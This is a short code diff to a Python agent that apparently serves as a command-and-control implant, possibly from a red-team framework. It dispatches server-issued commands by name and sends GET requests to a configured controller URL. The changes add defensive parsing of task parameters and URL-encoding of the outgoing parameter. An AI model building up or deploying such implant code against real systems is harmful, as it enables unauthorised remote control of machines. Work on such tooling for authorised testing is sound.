@@ -1,5 +1,6 @@
 import os, random, sys, json, socket, base64, time, platform, ssl, getpass
 import urllib.request
+from urllib.parse import quote as urlquote
 from datetime import datetime
 import threading, queue
 
@@ -103,7 +104,11 @@ CRYPTO_HERE
             fn = getattr(self, task["command"], None)
             if callable(fn):
                 try:
-                    params = json.loads(task["parameters"]) if task["parameters"] else {}
+                    try:
+                        raw = json.loads(task["parameters"]) if task["parameters"] else {}
+                    except Exception:
+                        raw = {}
+                    params = raw if isinstance(raw, dict) else {}
                     params["task_id"] = task["task_id"]
                     output = fn(**params)
                     task["result"]    = str(output) if output is not None else ""
@@ -202,7 +207,8 @@ CRYPTO_HERE
             if method == 'GET':
                 param = data.decode() if isinstance(data, bytes) else data
                 url   = "{}{}?{}={}".format(base, self.agent_config["GetURI"],
-                                            self.agent_config["GetParam"], param)
+                                            self.agent_config["GetParam"],
+                                            urlquote(param, safe=''))
                 req   = urllib.request.Request(url, None, hdrs)
             else:
                 post_data = data if isinstance(data, bytes) else data.encode()
